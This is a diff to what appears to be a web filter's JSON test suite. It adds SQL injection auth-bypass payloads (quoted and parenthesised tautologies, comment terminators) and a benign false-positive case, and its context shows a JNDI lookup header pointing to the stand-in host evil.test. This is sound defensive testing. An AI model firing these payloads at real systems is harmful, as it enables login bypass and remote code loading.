@@ -11,6 +11,61 @@
     "desc": "UNION SELECT exfil (SQLi-001)"
   },
   {
+    "id": "sqli-tautology-quoted",
+    "category": "SQL_INJECTION",
+    "kind": "malicious",
+    "vector": "url",
+    "method": "GET",
+    "path": "/login?user=admin%27%20OR%20%271%27%3D%271&pass=x",
+    "expect": "block",
+    "gate": "hard",
+    "desc": "quoted tautology, the canonical auth bypass (SECURE-INPT-01)"
+  },
+  {
+    "id": "sqli-tautology-nodigit",
+    "category": "SQL_INJECTION",
+    "kind": "malicious",
+    "vector": "url",
+    "method": "GET",
+    "path": "/login?user=%27%20OR%20%27a%27%3D%27a&pass=x",
+    "expect": "block",
+    "gate": "hard",
+    "desc": "quoted tautology with no digits at all (SECURE-INPT-01)"
+  },
+  {
+    "id": "sqli-tautology-paren",
+    "category": "SQL_INJECTION",
+    "kind": "malicious",
+    "vector": "url",
+    "method": "GET",
+    "path": "/login?user=admin%27%29%20OR%20%28%271%27%3D%271&pass=x",
+    "expect": "block",
+    "gate": "hard",
+    "desc": "parenthesised tautology (SECURE-INPT-01)"
+  },
+  {
+    "id": "sqli-comment-terminate",
+    "category": "SQL_INJECTION",
+    "kind": "malicious",
+    "vector": "url",
+    "method": "GET",
+    "path": "/login?user=admin%27--&pass=x",
+    "expect": "block",
+    "gate": "hard",
+    "desc": "comment terminator truncating the password check (SECURE-INPT-01)"
+  },
+  {
+    "id": "benign-equality-prose",
+    "category": "SQL_INJECTION",
+    "kind": "benign",
+    "vector": "url",
+    "method": "GET",
+    "path": "/docs/faq?q=is%20%27true%27%20%3D%20%27true%27%20in%20python",
+    "expect": "allow",
+    "gate": "hard",
+    "desc": "quoted equality in ordinary prose must NOT block (FP stress for SECURE-INPT-01)"
+  },
+  {
     "id": "xss-script-alert",
     "category": "XSS_ATTACKS",
     "kind": "malicious",
@@ -83,7 +138,9 @@
     "vector": "header",
     "method": "GET",
     "path": "/",
-    "headers": ["User-Agent: ${jndi:ldap://evil.test/x}"],
+    "headers": [
+      "User-Agent: ${jndi:ldap://evil.test/x}"
+    ],
     "expect": "block",
     "gate": "hard",
     "desc": "JNDI lookup in User-Agent (L4S-001, header surface)"
@@ -207,7 +264,9 @@
     "vector": "header",
     "method": "GET",
     "path": "/",
-    "headers": ["User-Agent: X-Scanner: Sqlmap"],
+    "headers": [
+      "User-Agent: X-Scanner: Sqlmap"
+    ],
     "expect": "block",
     "gate": "hard",
     "desc": "Scanner signature in UA (PROTO-002)"
@@ -254,7 +313,7 @@
     "path": "/p?u=%E2%80%8Badmin",
     "expect": "block",
     "gate": "soft",
-    "desc": "Zero-width space obfuscation (UNI-001) — soft: interacts with NFKC normalization"
+    "desc": "Zero-width space obfuscation (UNI-001) \u2014 soft: interacts with NFKC normalization"
   },
   {
     "id": "financial-single-card",
@@ -265,9 +324,8 @@
     "path": "/p?cc=4111111111111111",
     "expect": "pass",
     "gate": "soft",
-    "desc": "Single Visa PAN — sub-threshold by design (FIN-001 score 2 < 10), corroborating signal only"
+    "desc": "Single Visa PAN \u2014 sub-threshold by design (FIN-001 score 2 < 10), corroborating signal only"
   },
-
   {
     "id": "benign-index",
     "category": "BENIGN",
